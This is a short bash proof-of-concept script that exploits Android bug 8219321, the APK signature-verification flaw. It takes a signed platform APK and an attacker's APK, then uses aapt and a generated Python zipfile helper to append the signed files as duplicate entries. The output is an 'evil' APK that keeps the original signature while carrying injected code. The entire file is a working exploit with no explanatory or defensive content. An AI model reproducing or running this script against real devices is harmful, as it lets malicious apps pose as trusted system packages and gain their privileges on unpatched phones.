#!/bin/bash
# PoC for Android bug 8219321 by @pof
# +info: https://jira.cyanogenmod.org/browse/CYAN-1602

if [ $# != 2 ]; then echo "Usage: $0 <platform.apk> <inject.apk>" ; exit 1 ; fi

PLATFORM="$1"
INJECT="$2"

if [ ! -f "$PLATFORM" ]; then echo "ERROR: $PLATFORM does not exist" ; exit 1; fi
if [ ! -f "$INJECT" ]; then echo "ERROR: $INJECT does not exist" ; exit 1; fi

mkdir tmp
cd tmp
unzip ../$PLATFORM
cp ../$INJECT ./out.apk

cat >poc.py <<-EOF
#!/usr/bin/python
import zipfile 
import sys
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
EOF
chmod 755 poc.py

for f in `find . -type f |sed -e "s:^\./::g" |egrep -v "(poc.py|out.apk)"` ; do aapt add -v out.apk "$f" ; if [ $? != 0 ]; then ./poc.py out.apk "$f" ; fi ; done

SN=`openssl pkcs7 -inform DER -in META-INF/*.RSA -noout -print_certs -text |grep "Serial Number" |awk '{print $3}' |cut -f 1 -d "/"`
CN=`openssl pkcs7 -inform DER -in META-INF/*.RSA -noout -print_certs -text |grep "Issuer:" |sed -e "s/ /\n/g" |grep "^CN=" |cut -f 1 -d "/" |sed -e "s/^CN=//g"`

cp out.apk ../evil-${SN}-${CN}-${PLATFORM}
cd ..
rm -rf tmp
echo "Modified APK: evil-${SN}-${CN}-${PLATFORM}"
